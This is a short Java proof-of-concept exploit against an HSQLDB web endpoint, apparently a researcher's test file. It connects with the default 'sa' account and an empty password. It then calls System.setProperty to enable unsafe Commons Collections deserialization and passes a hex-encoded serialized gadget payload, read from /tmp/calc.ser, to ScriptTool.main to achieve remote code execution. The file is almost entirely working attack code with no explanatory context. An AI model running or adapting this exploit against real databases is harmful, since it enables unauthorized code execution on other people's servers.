import org.apache.commons.codec.binary.Hex;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;
import java.sql.Statement;


public class testjava {

    public static void main(String[] args) throws IOException, ClassNotFoundException, SQLException {
        String url = "http://localhost:8088";
        String payload = Hex.encodeHexString(Files.readAllBytes(Paths.get("/tmp/calc.ser")));

        System.out.println(payload);

        String dburl = "jdbc:hsqldb:" + url + "/hsqldb_war_exploded/hsqldb/";
        Class.forName("org.hsqldb.jdbcDriver");

        Connection connection = DriverManager.getConnection(dburl, "sa", "");
        Statement statement = connection.createStatement();
        statement.execute("call \"java.lang.System.setProperty\"('org.apache.commons.collections.enableUnsafeSerialization','true')");
        statement.execute("call \"org.hsqldb.util.ScriptTool.main\"('" + payload + "');");
    }

}
